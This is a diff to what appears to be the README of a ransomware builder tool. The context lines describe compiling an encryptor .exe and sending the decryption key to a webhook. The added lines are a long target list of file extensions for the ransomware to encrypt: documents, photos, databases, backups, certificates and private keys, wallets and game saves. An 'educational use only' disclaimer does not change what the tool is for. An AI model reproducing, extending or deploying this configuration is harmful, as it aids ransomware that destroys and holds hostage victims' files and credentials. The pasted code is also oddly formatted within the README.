@@ -55,3 +55,28 @@ This tool is for EDUCATIONAL USE ONLY. The developers are not responsible for an
          Click "Build Encryptor EXE" to compile a standalone .exe file (located in the dist/ folder).
           
     Recovery: Use the generated Decryptor (input the key sent to your webhook) to restore files. 
+
+
+TARGET_EXTENSIONS =
+
+( ".txt", ".doc", ".docx", ".mp3", ".xls", ".xlsx", ".ppt", ".sql", ".wmv", ".mp4", ".dll", ".jar", 
+    ".pptx", ".odt", ".jpg", ".tar", ".gz", ".bmp", ".pbm", ".rtf", ".png", ".csv", ".mdb", ".sln", 
+    ".php", ".avi", ".mov", ".flv", ".amv", ".mpv", ".mtv", ".asp", ".aspx", ".html", ".xml", ".psd", 
+    ".pdf", ".exe", ".rv", ".rvx", ".ved", ".wm", ".wma", ".midi", ".fla", ".ico", ".gif", ".GIF", 
+    ".ogg", ".mpg", ".icns", ".RAR", ".zip", ".BAT", ".c", ".PNG", ".7z", ".sql", ".m4a", ".d3dbsp", 
+    ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", 
+    ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", 
+    ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", 
+    ".sb", ".fos", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", 
+    ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", 
+    ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
+    ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", "rofl", ".hkx", ".bar", 
+    ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", 
+    ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".bigwallet", ".wotreplay", 
+    ".xxx", ".desc", ".py", ".m3u", ".js", ".css", ".rb", ".jpeg", ".p7c", ".p7b", ".p12", 
+    ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", "r3d", ".rw2", 
+    ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrw", ".ref", ".mef", ".erf", ".kdc", ".dcr", 
+    ".cr2", ".crw", ".cerber", ".WNCRY", ".dsewrbg", ".bay", ".sr2", ".srf", ".arw", ".3fr", 
+    ".dng", ".jpe", ".cdr", ".indd", ".ai", ".eps", ".pdd", ".dbf", ".mdf", ".wb2", ".wpd", 
+    ".dxg", ".xf", ".dwg", ".pst", ".vbs", ".accdb", ".pptm", ".xlsb", ".xlsm", ".wps", 
+    ".docm", ".odb", ".odc", "odm", ".odp", ".ods", ".odt")
